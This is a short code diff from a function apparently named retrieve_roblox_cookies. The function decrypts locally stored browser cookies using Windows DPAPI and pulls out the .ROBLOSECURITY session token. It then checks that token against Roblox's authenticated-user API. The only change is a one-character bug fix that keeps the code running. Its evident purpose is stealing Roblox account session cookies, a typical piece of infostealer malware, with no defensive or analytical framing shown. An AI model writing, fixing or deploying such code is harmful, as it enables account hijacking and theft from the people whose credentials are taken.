@@ -27,7 +27,7 @@ def retrieve_roblox_cookies():
 
                 try:
                     decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
-                    cookie_result = decrypted_cookies.decode('utf-8', errors='ignore')s
+                    cookie_result = decrypted_cookies.decode('utf-8', errors='ignore')
 
                     try:
                         user_info_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie_result.split(".ROBLOSECURITY=")[-1].strip(";")})
